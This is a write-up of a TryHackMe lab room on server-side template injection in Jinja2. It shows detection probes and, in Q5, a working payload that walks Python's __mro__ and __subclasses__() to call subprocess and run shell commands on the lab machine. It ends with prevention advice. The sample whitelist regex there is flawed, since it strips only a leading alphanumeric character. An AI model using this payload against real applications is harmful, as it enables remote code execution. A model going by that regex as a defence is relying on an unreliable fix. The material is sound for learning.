# Tryhackme

![image](https://github.com/HACKER097/WebEx/assets/38581702/7b639b47-eb9b-431c-82b5-46a4a6a888ba)


## Q1

Just introduces SSTI (Server side template injection) Basically, its sending data which the server reads as a template and runs.

## Q2

We are required to find out which character requence cause errors. After trying out a bunch of things, its `{{`. The error is likely a syntax error, the interpreter expects a `}}` after `{{` and gives an error when it doesnt find it.

## Q3

We have to find out which tempeleting engine is being used. They have given a very useful decision tree.

![image](https://github.com/HACKER097/WebEx/assets/38581702/4208f7ee-8db9-4529-8961-1db6103b68ea)

`${7*7}` Not evaluated

`{{7*7}}` Evaluated

`{{7*'7'}}` Evaluated as `7777777` which is very pythonic. 

So according to the tree, we are using Jinja2 or Twig

## Q4

Jinja2 comments start with `{#`, but there are also other ways to start comments.

## Q5

Explains how to make a ssti payload. Here we are finding the class of an empty string, and then using mro to get to other classes. One of them being subprocess which can be used to run shell commands

This is the final command `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}` which gives output jake.

`''.__class__.__mro__[1]` Gives us the object class.

`__subclasses__()` gives us the subclasses in the object class, 401 is targeting the subprocess subclass.

`("whoami", shell=True, stdout=-1).communicate()` is basicaalt the same as running `subprocess.Popen(...)`

## Q6

Explains the mechanism of SSTI, basically because the input has no blacklists, we can input strings which act as a template, and are executed.

## Q7

Prevention can be done by using the secure jinja2 syntax

```python
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```

Its similar to SQLI prevention, where we pass the input as data instead of letting the compiler/interpreter decide weather its data or code.

We can also introduce a whitelist

`re.sub("^[A-Za-z0-9]", "", user)`
